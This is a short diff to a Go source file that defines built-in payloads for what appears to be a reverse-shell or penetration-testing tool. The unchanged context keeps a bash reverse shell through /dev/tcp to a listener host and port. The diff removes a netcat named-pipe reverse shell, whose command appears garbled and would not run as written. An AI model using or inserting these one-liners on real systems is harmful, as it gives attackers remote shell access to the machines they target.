@@ -29,11 +29,6 @@ var builtinPayloads = []builtinPayload{
 		Raw:     `(bash >& /dev/tcp/{LHOST}/{LPORT} 0>&1) &`,
 		Wrapper: "bash",
 	},
-	{
-		Name:    "Netcat + named pipe",
-		Raw:     `(rm /tmp/_*mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc {LHOST} {LPORT} >/tmp/_) >/dev/null 2>&1 &`,
-		Wrapper: "sh",
-	},
 }
 
 // PayloadModel is the model for the Payload tab.
